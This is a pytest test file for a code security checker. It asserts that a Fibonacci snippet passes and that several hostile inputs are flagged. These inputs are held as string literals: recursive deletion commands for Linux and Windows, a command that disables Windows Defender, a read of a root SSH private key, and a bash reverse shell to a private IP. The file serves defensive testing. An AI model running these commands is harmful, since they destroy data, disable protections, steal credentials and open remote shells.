"""Tests for AXEN Security & Safety Checker."""

from __future__ import annotations

import pytest
from reasoning.coding.security import SecurityRisk, check_security


def test_safe_code_passes():
    safe_python = """
    def fib(n):
        if n <= 1:
            return n
        return fib(n - 1) + fib(n - 2)

    print([fib(i) for i in range(10)])
    """
    report = check_security(safe_python)
    assert report.risk == SecurityRisk.SAFE
    assert report.is_safe_to_execute is True
    assert len(report.findings) == 0


def test_dangerous_file_deletion_blocked():
    dangerous_bash = "rm -rf / --no-preserve-root"
    rep = check_security(dangerous_bash)
    assert rep.risk == SecurityRisk.DANGEROUS
    assert rep.is_safe_to_execute is False
    assert any(f.category == "file_destruction" for f in rep.findings)

    dangerous_windows = "del /s /q C:\\Windows"
    rep_win = check_security(dangerous_windows)
    assert rep_win.risk == SecurityRisk.DANGEROUS
    assert rep_win.is_safe_to_execute is False


def test_system_tampering_blocked():
    code = "Set-MpPreference -DisableRealtimeMonitoring $true"
    rep = check_security(code)
    assert rep.risk == SecurityRisk.DANGEROUS
    assert rep.is_safe_to_execute is False
    assert any(f.category == "security_tampering" for f in rep.findings)


def test_credential_theft_blocked():
    code = "with open('/root/.ssh/id_rsa') as f: print(f.read())"
    rep = check_security(code)
    assert rep.risk == SecurityRisk.DANGEROUS
    assert rep.is_safe_to_execute is False
    assert any(f.category == "credential_access" for f in rep.findings)


def test_reverse_shell_blocked():
    code = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
    rep = check_security(code)
    assert rep.risk == SecurityRisk.DANGEROUS
    assert rep.is_safe_to_execute is False
    assert any(f.category == "reverse_shell" for f in rep.findings)


def test_warning_severity():
    code = "user_input = '1+1'\nres = eval(user_input)"
    rep = check_security(code)
    assert rep.risk == SecurityRisk.WARNING
    # Warnings do not outright block controlled execution unless DANGEROUS
    assert rep.is_safe_to_execute is True
